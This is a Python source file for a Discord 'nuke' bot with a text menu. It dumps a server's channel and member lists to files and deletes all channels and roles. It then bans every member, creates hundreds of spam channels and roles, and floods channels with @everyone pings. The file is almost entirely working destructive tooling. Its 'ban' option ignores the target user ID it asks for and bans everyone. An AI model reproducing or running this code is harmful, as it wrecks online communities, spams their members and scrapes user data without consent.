import discord
import time
import os
import asyncio

intents = discord.Intents.default()
intents.members = True
client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print('logged in as {0.user}'.format(client))

    def botstat():
        for guild in client.guilds:
            print(f"Name: {guild.name} -- ID: {guild.id} -- Members: {guild.member_count}\n")

    def channeldump():
        id0 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == id0:
                file = f"{guild.name}_{guild.id}_dumped_channels.txt"
                f = open(file, "a+")
                for c in guild.channels:
                    try:
                        print(f"Name: {c.name} - ID: {c.id}")
                        f.write(f"Name: {c.name} - ID: {c.id}")
                    except:
                        pass
                    finally:
                        pass
                print(f"Output saved to: {file}")
                f.close()

    def userdump():
        id1 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id1):
                print(f"Getting member list of {id1}")
                file = f"{guild.name}_{guild.id}_dumped_users.txt"
                f = open(file, "a+")
                for member in guild.members:
                    try:
                        f.write(f"Name: {member.name}#{member.discriminator} ID: {member.id}")
                        print(f"Name: {member.name}#{member.discriminator} ID: {member.id}")
                    except:
                        pass
                    finally:
                        pass
                print(f"output saved to: {file}")
                f.close()

    async def nuke():
        id2 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id2):
                print(f"starting on {guild.name} - ID: {guild.id}")
                var1 = 0
                var2 = 0
                var3 = 0
                for channels in guild.channels:
                    try:
                        await channels.delete()
                        var1 += 1
                        print(f"current ammount of deleted channels: {var1}")
                    except:
                        pass
                    finally:
                        pass
                print(f"stage 1 complete : All deletable channels deleted - {var1}")
                for roles in guild.roles:
                    try:
                        await roles.delete()
                        var2 += 1
                        print(f"current ammount of deleted roles: {var2}")
                    except:
                        pass
                    finally:
                        pass
                print(f"stage 2 complete : All deletable roles deleted - {var2}")
                for members in guild.members:
                    try:
                        await members.ban(reason="owo")
                        time.sleep(0.2)
                        var3 += 1
                        print(f"current ammount of banned users: {var3}")
                    except:
                        pass
                    finally:
                        pass
                print(f"stage 3 complete: All bannable members were banned - count: {var3}")

                for i in range(1, 501):
                    try:
                        await guild.create_text_channel('☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
                        print(f"current ammount of channels created: {i}")
                        # time.sleep(0.2)
                    except:
                        pass
                    finally:
                        pass
                for i in range(1, 251):
                    try:
                        await guild.create_role(name='☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
                        print(f"current ammount of roles created: {i}")
                        # time.sleep(0.2)
                    except:
                        pass
                    finally:
                        pass
                print("End of script\n")

    async def ban():
        id3 = int(input("Server ID: "))
        userid = int(input("User ID: "))
        for guild in client.guilds:
            if guild.id == int(id3):
                for members in guild.members:
                    await members.ban(reason="owo")
                    print(f"Successfully banned {members.name}#{members.tag} -- {members.id}")

    async def unban():
        id3 = int(input("Server ID: "))
        userid = int(input("User ID: "))
        for guild in client.guilds:
            if guild.id == int(id3):
                banned_u = await guild.bans()
                for banned_u1 in banned_u:
                    if banned_u1.user.id == userid:
                        await guild.unban(banned_u1.user)
                        print(f"Successfully unbanned {userid}")

    async def unbanall():
        id3 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id3):
                banned_u = await guild.bans()
                for banned_u1 in banned_u:
                    await guild.unban(banned_u1.user)
                    print(f"Successfully unbanned {banned_u1}")

    async def listbans():
        id3 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id3):
                banned_u = await guild.bans()
                for banned_u1 in banned_u:
                    try:
                        print(banned_u1)
                    finally:
                        pass

    async def rickroll():
        id3 = int(input("Server ID: "))
        for guild in client.guilds:
            if guild.id == int(id3):
                x = 0
                while x <= 100:
                    for c in guild.channels:
                        time.sleep(0.8)
                        await c.send("@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                     "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                     "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone"
                                     "@everyone @everyone https://c.tenor.com/VFFJ8Ei3C2IAAAAM/rickroll-rick.gif "
                                     "https://c.tenor.com/VFFJ8Ei3C2IAAAAM/rickroll-rick.gif ")
                    x += 1
                    print(x)

    while True:
        print("Options:\n[1]botstat\n[2]channeldump (dumps channels into a local file)\n[3]userdump (dumps "
              "userinfo into a local file)\n[4]invade (nukes a server entirely (LOL))\n[5]ban a member\n[51]Unban a "
              "member\n[52]Unban ALL members\n[53]List all banned members\n[6]Get Rickrolled")
        command = input(">> ")
        if command == "1":
            botstat()
        elif command == "2":
            channeldump()
        elif command == "3":
            userdump()
        elif command == "4":
            await nuke()
        elif command == "5":
            await ban()
        elif command == "51":
            await unban()
        elif command == "52":
            await unbanall()
        elif command == "53":
            await listbans()
        elif command == "6":
            await rickroll()


client.run("YOUR-TOKEN")
